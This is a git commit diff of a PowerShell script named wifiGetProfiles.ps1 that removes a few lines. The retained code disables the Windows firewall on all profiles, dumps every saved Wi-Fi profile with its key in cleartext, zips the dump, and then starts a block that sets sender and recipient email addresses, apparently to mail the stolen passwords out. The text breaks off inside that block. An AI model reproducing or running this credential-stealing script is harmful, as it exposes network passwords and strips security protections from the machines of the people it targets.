361dde7405ade3c94e5ad7b7ea821bbe6ece411f
ioChelox <86814661+ioChelox@users.noreply.github.com>
2022-07-07 18:07:27 -0400

    Update wifiGetProfiles.ps1

--- wifiGetProfiles.ps1
+++ wifiGetProfiles.ps1
@@ -1,15 +1,7 @@
-$folderAcc = "accountsInfo"
-mkdir $folderAcc
-
 netsh advfirewall set allprofiles state off
-
 $allProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}
-
 $allProfiles >> allProfiles.txt
-
-
 Compress-Archive -Path 'allProfiles.txt' -DestinationPath 'allProfiles.zip'
-
 try {
     $Sender = 'ioinfinitum@vivaldi.net'
     $Recipient = 'nine9brains@gmail.com'
